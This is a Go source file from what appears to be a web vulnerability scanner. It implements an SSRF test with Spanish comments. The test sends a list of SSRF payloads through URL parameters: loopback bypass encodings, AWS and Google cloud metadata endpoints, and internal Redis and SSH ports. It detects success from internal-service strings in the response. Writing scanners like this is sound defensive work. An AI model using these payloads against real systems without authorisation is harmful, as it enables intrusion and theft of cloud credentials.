package tests

import (
	"fmt"
	"io"
	"net/url"
	"strings"
	"sync"

	"github.com/versaSecurityTest/internal/config"
)

// SSRFTest - Test de Server-Side Request Forgery
type SSRFTest struct {
	Discovery *DiscoveryResult
}

// Run ejecuta el test de SSRF
func (t *SSRFTest) Run(targetURL string, client HTTPClient, payloads *config.PayloadConfig) TestResult {
	result := TestResult{
		TestName:    "Server-Side Request Forgery (SSRF)",
		Status:      "Passed",
		Description: "No se detectaron vulnerabilidades de SSRF",
		Severity:    "None",
		Details:     []string{},
		Evidence:    []Evidence{},
	}

	ssrfPayloads := []string{
		"http://127.0.0.1:80",
		"http://127.1:80",      // Bypass decimal simple
		"http://0177.0.0.1:80", // Bypass Octal
		"http://2130706433:80", // Bypass Dotted Decimal
		"http://[::1]:80",      // IPv6 Loopback
		"http://localhost:22",
		"http://169.254.169.254/latest/meta-data/",
		"http://metadata.google.internal/computeMetadata/v1/",
		"http://127.0.0.1:6379", // Redis
		"http://0.0.0.0:22",
	}

	var endpointsToTest []string
	var paramsToTest []string

	if t.Discovery != nil && len(t.Discovery.Endpoints) > 0 {
		for _, info := range t.Discovery.Endpoints {
			endpointsToTest = append(endpointsToTest, info.Path)
			paramsToTest = append(paramsToTest, info.Params...)
		}
	} else {
		endpointsToTest = []string{"/", "/api/fetch", "/proxy"}
		paramsToTest = []string{"url", "link", "dest", "src"}
	}

	var wg sync.WaitGroup
	var mu sync.Mutex
	vulnerabilitiesFound := 0

	for _, endpoint := range endpointsToTest {
		for _, param := range paramsToTest {
			for _, payload := range ssrfPayloads {
				wg.Add(1)
				go func(e, p, pay string) {
					defer wg.Done()
					testURL := fmt.Sprintf("%s%s?%s=%s", targetURL, e, p, url.QueryEscape(pay))

					resp, err := client.Get(testURL)
					if err != nil {
						return
					}
					defer resp.Body.Close()

					body, _ := io.ReadAll(resp.Body)
					content := string(body)

					// Analizar si hay indicios de SSRF
					isVuln := false
					reason := ""

					if strings.Contains(content, "SSH-2.0") || strings.Contains(content, "redis_version") ||
						strings.Contains(content, "ami-id") || strings.Contains(content, "instance-id") {
						isVuln = true
						reason = "Contenido de servicio interno detectado en la respuesta"
					}

					if isVuln {
						mu.Lock()
						vulnerabilitiesFound++
						result.Evidence = append(result.Evidence, Evidence{
							Type:        "SSRF",
							URL:         testURL,
							Payload:     pay,
							StatusCode:  resp.StatusCode,
							Description: reason,
							Severity:    "Critical",
						})
						mu.Unlock()
					}
				}(endpoint, param, payload)
			}
		}
	}

	wg.Wait()

	if vulnerabilitiesFound > 0 {
		result.Status = "Failed"
		result.Severity = "Critical"
		result.Description = fmt.Sprintf("Se detectaron %d posibles vulnerabilidades de SSRF", vulnerabilitiesFound)
	}

	return result
}
